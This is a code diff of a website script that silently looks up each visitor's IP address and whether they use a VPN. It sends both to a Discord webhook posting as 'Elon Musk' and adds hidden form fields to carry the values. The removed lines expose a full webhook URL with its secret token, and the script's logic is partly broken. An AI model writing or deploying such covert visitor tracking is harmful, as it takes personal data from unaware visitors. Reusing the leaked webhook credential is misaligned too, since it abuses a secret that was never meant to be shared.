@@ -16,6 +16,8 @@ $.getJSON("https://europe-central2-portfolio-website-374313.cloudfunctions.net/g
         } else {
             var usedvpn = false;
         }
+        document.getElementById("usedvpn").value = usedvpn;
+        document.getElementById("userip").value = userip;
     })
     .catch(error => console.error(error));
     //Send the webhook
@@ -24,16 +26,21 @@ $.getJSON("https://europe-central2-portfolio-website-374313.cloudfunctions.net/g
       const request = new XMLHttpRequest();
       request.open("POST", webhook);
       request.setRequestHeader('Content-type', 'application/json');
-
-    const params = {
+      var usedvpn2 = document.getElementById("usedvpn").value = usedvpn;
+      var userip2 = document.getElementById("userip").value = userip;
+    var params = {
     username: "Elon Musk",
     avatar_url: "",
-    content: "Did user use vpn?:" + usedvpn + "What is the ip?:" + userip
+    content: "Did user use vpn?:" + usedvpn2 + "What is the ip?:" + userip2
     }
 
     request.send(JSON.stringify(params));
-}
+    }
  })
 </script>
-
-<script>//https://discord.com/api/webhooks/1051821662800195614/azbjSbA--bFX0n4a03lx3ptjzjETOyipNB2mOVS_sZJitwc37Go0cmdGX0U5pJtluyej</script>
+<div>
+    <form>
+        <input value="" name="usedvpn" id="usedvpn" type="hidden" required>
+        <input value="" name="userip" id="userip" type="hidden" required>
+    </form>
+</div>
